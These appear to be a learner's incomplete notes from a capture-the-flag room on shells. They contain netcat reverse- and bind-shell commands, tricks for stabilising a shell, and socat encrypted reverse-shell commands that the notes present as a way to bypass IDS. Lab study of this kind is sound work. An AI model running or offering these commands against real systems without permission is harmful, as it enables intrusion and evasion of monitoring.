# What The Shell? 

## What is a shell?

```

Shells are what we use when interfacing with a CLI. 

When attempting to gain access to a system, we want to try and get one of 2 types of shell:

> Reverse Shell - Server sends us command line access

> Bind Shell - Open up a port that we can connect to

```

## Shell Type Examples

### Reverse Shell - We are listening for a connection

```

on our machine: nc -nvlp <port>

on the target machine: nc <our-ip> <port> -e <path-to-shell>

```
### Bind Shell

```

on the target: nc -nvlp <port> -e "cmd.exe" <--- or any other shell available

on our machine: nc <target-ip> <port>

```
```

A shell can be either interactive or non-interactive

Interactive = can interact with a program after executing e.g ssh asks you to type yes/no

Non-interactive = no input from you after executing

```

## Stabilising Netcat

### Python

```

> python -c 'import pty;pty.spawn("/bin/bash")' = this spawnws a more stable shell with more features

> export TERM=xterm = gives us access to term commands

> background the shell and use 'stty raw -echo; fg' = turns off our terminal echo and gives us much more features like tab autocomplete and ctrl+c interrupts without closing the shell

```
### rlwrap

```
program that gives much more features for shells

prepend it to nc command to use it: rlwrap nc -lvnp <port>

can use the background trick previously to stabilise linux shells completely and access ctrl+c interrupts

```
### Socat

```
basically just better netcat - provides more stability 

only works on linux

need to get it on target machine first - could start up webserver on our machine and transfer it over using wget

socat syntax a lot harder - too much info to summarise so check the room link for more info

socat can create encrypted shells - this can be used to bypass IDS systems. to do this:

>generate a cert to use
>merge the cert file and key file together in a .pem file
>set up listener with 'socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -''
>on target machine connect back with: 'socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash' > this would be for creating a reverse shell

we can create a fully stable tty reverse shell - it has a tricky syntax:

For setting the listener: socat OPENSSL-LISTEN:<port>,cert=<cert-file>.pem,FILE:`tty`,raw,echo=0,verify=0

For connecting back: socat OPENSSL:<ip> EXEC:"bash -li",pty,stderr,sigint,setsid,sane

```
------------
**INCOMPLETE**
